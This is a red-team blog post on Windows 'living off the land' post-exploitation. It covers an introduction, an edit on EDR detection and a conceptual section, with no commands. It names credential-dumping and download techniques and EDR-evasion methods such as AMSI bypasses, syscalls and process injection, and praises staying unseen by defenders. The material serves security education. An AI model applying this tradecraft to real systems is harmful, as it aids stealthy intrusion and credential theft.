<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><link rel="icon" href="/favicon.ico"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><title>xbz0n@sh:~# <!-- -->Living Off the Land: Windows Post-Exploitation Without Tools</title><meta name="description" content="I&#x27;ll never forget one of my first red team engagements where I learned this lesson the hard way. I&#x27;d spent two days carefully phishing my way into a financia..."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xbz0n.sh/blog/living-off-the-land-windows"/><meta property="og:title" content="Living Off the Land: Windows Post-Exploitation Without Tools"/><meta property="og:description" content="I&#x27;ll never forget one of my first red team engagements where I learned this lesson the hard way. I&#x27;d spent two days carefully phishing my way into a financia..."/><meta property="og:image" content="https://xbz0n.sh/images/lolbins-windows.jpg"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image:alt" content="Living Off the Land: Windows Post-Exploitation Without Tools"/><meta property="twitter:card" content="summary_large_image"/><meta property="twitter:url" content="https://xbz0n.sh/blog/living-off-the-land-windows"/><meta property="twitter:title" content="Living Off the Land: Windows Post-Exploitation Without Tools"/><meta property="twitter:description" content="I&#x27;ll never forget one of my first red team engagements where I learned this lesson the hard way. I&#x27;d spent two days carefully phishing my way into a financia..."/><meta property="twitter:image" content="https://xbz0n.sh/images/lolbins-windows.jpg"/><meta property="image" content="https://xbz0n.sh/images/lolbins-windows.jpg"/><meta property="author" content="Ivan Spiridonov"/><link rel="canonical" href="https://xbz0n.sh/blog/living-off-the-land-windows"/><meta name="next-head-count" content="24"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><link rel="preload" href="/_next/static/css/af80ad17d62d10ed.css" as="style"/><link rel="stylesheet" href="/_next/static/css/af80ad17d62d10ed.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-ee7e63bc15b31913.js" defer=""></script><script src="/_next/static/chunks/framework-64ad27b21261a9ce.js" defer=""></script><script src="/_next/static/chunks/main-0a3c670da7f1f1eb.js" defer=""></script><script src="/_next/static/chunks/pages/_app-6f140346224d0b31.js" defer=""></script><script src="/_next/static/chunks/676-8a913a0c6948fe82.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5Bslug%5D-80e53230ab478c73.js" defer=""></script><script src="/_next/static/dwOljWfoZZJToQyW6QLtd/_buildManifest.js" defer=""></script><script src="/_next/static/dwOljWfoZZJToQyW6QLtd/_ssgManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap">@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKxjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8-qxjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8L6tjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next"><div class="flex flex-col min-h-screen"><nav class="bg-primary/80 backdrop-blur-sm sticky top-0 z-10 shadow-md"><div class="container py-4"><div class="flex items-center justify-between"><div class="flex items-center space-x-6"><a href="/"><span class="text-xl font-bold tracking-tighter bg-gradient-to-r from-accent to-blue-500 bg-clip-text text-transparent">xbz0n@sh:~#</span></a><div class="hidden md:flex space-x-6"><a class="nav-link" href="/">Home</a><a class="nav-link" href="/about">About</a><a class="nav-link" href="/blog">Blog</a><a class="nav-link" href="/tools">Tools</a><a class="nav-link" href="/cves">CVEs</a></div></div><div class="hidden md:flex items-center space-x-4"><a href="mailto:ivanspiridonov@gmail.com" class="text-gray-300 hover:text-accent" aria-label="Email"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path></svg></a><a href="https://github.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="GitHub"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a><a href="https://twitter.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="Twitter"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a><a href="https://www.linkedin.com/in/ivanspiridonov/" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="LinkedIn"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z"></path></svg></a><a href="https://app.hackthebox.com/public/users/8208" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="HackTheBox"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><title></title><path d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z"></path></svg></a></div><button class="md:hidden focus:outline-none" aria-label="Toggle menu"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="h-6 w-6 text-gray-300" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg></button></div></div></nav><main class="flex-grow container py-8"><article class="max-w-3xl mx-auto"><a class="text-accent hover:text-accent/80 mb-8 inline-block" href="/blog">‚Üê Back to all posts</a><div class="mb-8"><h1 class="text-3xl md:text-4xl font-bold mb-4">Living Off the Land: Windows Post-Exploitation Without Tools</h1><div class="flex items-center text-sm text-gray-400"><time dateTime="2025-11-28">November 28, 2025</time></div></div><div class="blog-content">
<p><img src="/images/lolbins-windows.jpg" alt="Windows post-exploitation techniques"></p>
<h2>Introduction</h2>
<p>I'll never forget one of my first red team engagements where I learned this lesson the hard way. I'd spent two days carefully phishing my way into a financial services company, finally landing a shell on a mid-level accountant's workstation. Excited about my success, I immediately uploaded Mimikatz to dump credentials. Within 15 minutes, my access was gone. The SOC had caught me, isolated the machine, and I was back to square one.</p>
<p>The problem wasn't that I got caught - that happens. The problem was that I'd made it ridiculously easy for them. Modern endpoint detection and response (EDR) solutions are trained to recognize offensive tools like Mimikatz, BloodHound, PowerShell Empire, and Cobalt Strike. These tools have well-known signatures, behaviors, and artifacts. The moment you drop them on disk or execute them in memory, you're essentially announcing your presence to anyone who's watching.</p>
<p>Here's what changed my approach completely: on my next engagement, I decided to use only tools that were already on the target systems. No uploads, no custom binaries, nothing that would raise immediate red flags. Just PowerShell, WMI, and other built-in Windows utilities. The result? I maintained access for three weeks, moved laterally across 15 systems, and exfiltrated the target data - all without triggering a single alert.</p>
<p>That's the power of "living off the land." Instead of bringing your own tools and hoping they won't be detected, you use what's already there. Windows comes packed with incredibly powerful administrative utilities - PowerShell, Windows Management Instrumentation (WMI), certutil, bitsadmin, and dozens of other legitimate executables. These tools are signed by Microsoft, they're supposed to be on the system, and administrators use them every single day.</p>
<p>What makes this approach so effective isn't just that you avoid signature-based detection. It's that you force defenders to focus on behavioral analysis instead of simple file or process signatures. Security teams can't just block PowerShell or disable WMI - their own IT staff relies on these tools for day-to-day system administration. This creates a fundamental challenge for defenders: how do you distinguish malicious use of legitimate tools from normal administrative activity?</p>
<p>In this article, I'll walk you through everything I've learned about conducting complete post-exploitation operations using nothing but native Windows tools. We'll cover initial reconnaissance, credential harvesting, lateral movement, persistence mechanisms, and data exfiltration - all while maintaining the lowest possible operational footprint. More importantly, I'll explain why these techniques work, what defenders see when you use them, and how to make your operations blend in with legitimate administrative activity.</p>
<hr>
<h2>üîÑ EDIT (December 2, 2025): The Modern Detection Landscape</h2>
<p>After publishing this article, I received valuable feedback from fellow security professionals about the current state of EDR detection for these techniques. I want to address this head-on because it's crucial context for anyone learning these methods in 2025.</p>
<p><strong>The reality is this: many of the "classic" LOLBin techniques described in this article are now heavily monitored and flagged by modern EDR solutions.</strong> When I first learned these techniques years ago, they were relatively quiet. Today's security landscape is different.</p>
<p>Here's what you need to know about detection in 2025:</p>
<p><strong>High-Risk Techniques (Loud on Modern EDRs):</strong></p>
<ul>
<li><strong>LSASS memory access</strong> (comsvcs.dll dumps, procdump) - Immediate alerts on CrowdStrike, Defender ATP, SentinelOne, Carbon Black</li>
<li><strong>Registry hive dumps</strong> (SAM/SECURITY/SYSTEM) - Straightforward detection rules exist</li>
<li><strong>Certutil downloads</strong> - Flagged even by Windows Defender in many configurations</li>
<li><strong>Nltest/dsquery/setspn enumeration</strong> - Detection engineers are creating specific use cases for these</li>
<li><strong>WMI remote execution</strong> - Behavioral detections in restricted corporate environments</li>
<li><strong>Rundll32 with comsvcs</strong> - Process tree analysis makes this obvious</li>
</ul>
<p><strong>What This Means for Real Engagements:</strong></p>
<p>These techniques are <strong>foundational knowledge</strong> - they teach you how Windows works and what's possible with built-in tools. However, using them as-is in a modern, hardened environment will likely get you caught quickly. They're building blocks, not complete solutions.</p>
<p><strong>To operate successfully in 2025, you need to layer these techniques with:</strong></p>
<ul>
<li><strong>AMSI bypasses</strong> for PowerShell operations</li>
<li><strong>Direct syscalls</strong> to avoid EDR hooks</li>
<li><strong>Process injection</strong> to hide execution chains and parent-child relationships</li>
<li><strong>Memory-only execution</strong> to avoid disk-based artifacts</li>
<li><strong>Custom tool modifications</strong> to avoid known signatures</li>
<li><strong>Behavioral blending</strong> to match legitimate admin activity patterns</li>
<li><strong>PPL/Credential Guard bypasses</strong> for credential access</li>
</ul>
<p><strong>Why I'm Keeping This Article As-Is:</strong></p>
<p>This article documents fundamental techniques that every security professional should understand. These methods work perfectly in:</p>
<ul>
<li><strong>Lab environments</strong> and home labs for learning</li>
<li><strong>Legacy systems</strong> without modern EDR</li>
<li><strong>Security research</strong> and understanding Windows internals</li>
<li><strong>Building custom tools</strong> that incorporate evasion techniques</li>
<li><strong>Red team operations</strong> when properly adapted with evasion layers</li>
</ul>
<p>Think of these techniques as learning the alphabet before writing poetry. You need to understand these fundamentals before you can effectively implement the advanced evasion techniques required for modern environments.</p>
<p><strong>The Bottom Line:</strong></p>
<p>If you're planning to use these techniques on a real engagement against a mature security program with modern EDR, you'll need to significantly adapt them. The concepts are sound, but the implementation needs sophistication beyond what's shown here. Consider this a starting point for building more advanced tradecraft, not a copy-paste playbook for 2025 engagements.</p>
<p>I'll be adding specific EDR detection warnings throughout the article to highlight which techniques are particularly noisy in modern environments.</p>
<hr>
<h2>Understanding Living Off the Land</h2>
<p>Before we dive into specific techniques, let's talk about what "living off the land" actually means and why it's become such a critical part of modern red teaming.</p>
<p>The term comes from the military concept of living off the land during operations - using local resources instead of bringing your own supplies. In cybersecurity, it refers to using built-in system tools and legitimate executables for malicious purposes. These binaries are often called LOLBins (Living Off the Land Binaries) or LOLBAs (Living Off the Land Binaries and Scripts).</p>
<p>The <a href="https://lolbas-project.github.io/">LOLBAS Project</a> maintains the most comprehensive database of Windows binaries that can be abused for offensive operations. When I'm planning an engagement, I always reference this project because it documents exactly how each binary can be abused, what permissions are required, and what artifacts are left behind. But here's the key thing to understand: these aren't vulnerabilities or exploits. They're legitimate features being used in ways Microsoft didn't necessarily intend, but that aren't technically "wrong" from a system perspective.</p>
<p>Let me give you a concrete example. Take certutil.exe - it's a legitimate Windows utility designed for managing certificates. System administrators use it all the time for certificate operations. But certutil also happens to have a feature that lets you download files from URLs. Microsoft included this feature for legitimate purposes - downloading certificate revocation lists, for example. But from an attacker's perspective, it's a perfect tool for downloading payloads or exfiltrating data. When you use certutil to download a file, Windows Defender doesn't flag it as malicious because certutil is a signed Microsoft binary doing exactly what it's designed to do.</p>
<p>This creates a fundamental asymmetry that favors attackers. Defenders have to distinguish between legitimate use (an admin downloading a certificate) and malicious use (an attacker downloading a payload) of the exact same command. The tool itself isn't malicious, the binary isn't suspicious, and the signature is valid. The only difference is the intent behind the action.</p>
<p>Here's why this approach is so powerful in modern environments. You eliminate the need to upload anything to the target system, which means every potential detection point disappears. EDR solutions scan new files, behavioral analysis engines watch for unusual file creation patterns, and forensic investigators can find your tools long after you're gone. When you use only built-in tools, there's nothing suspicious to find because you're using tools that are supposed to be there.</p>
<p>Everything you run is signed by Microsoft and trusted by the operating system. Application whitelisting solutions are designed to prevent unauthorized executables from running, but they won't stop you because you're using executables that are explicitly whitelisted by default. Even strict AppLocker policies typically whitelist system directories where these tools live, so you can operate without triggering application control mechanisms.</p>
<p>Your activity blends in with normal administrative operations in a way that's nearly impossible to distinguish without deep behavioral analysis. System administrators use PowerShell constantly for automation and management. They use WMI for remote system queries. They create scheduled tasks for maintenance operations. When you use these same tools, your actions look like normal IT activity in the logs. This makes life incredibly difficult for SOC analysts trying to identify malicious activity in a sea of legitimate operations.</p>
<p>Defenders can't simply block these tools without breaking their own IT operations, which creates a fundamental dilemma for security teams. I've seen organizations try to disable PowerShell after getting compromised, only to realize that half their automation scripts and management tools depend on it. These utilities are so deeply integrated into Windows administration that blocking them entirely isn't feasible for most organizations. The security team's hands are tied by operational requirements.</p>
<p>When you do get caught and someone analyzes what you did, there are no custom tools for forensic investigators to reverse engineer. They can't extract your C2 protocols, learn about your infrastructure, or discover indicators that might help them find your other operations. You used the same tools their own IT staff uses, just in creative ways, which means the forensic trail leads nowhere useful for attribution or infrastructure discovery.</p>
<p>The downside - and there's always a downside - is that this approach requires significantly more skill and understanding than just running off-the-shelf tools. You need to really understand Windows internals, know how different utilities work, and be able to chain them together to accomplish your objectives. You need to understand what logs your actions create and how to avoid patterns that might trigger behavioral detections. It's more challenging, but the payoff in terms of operational security is massive.</p>
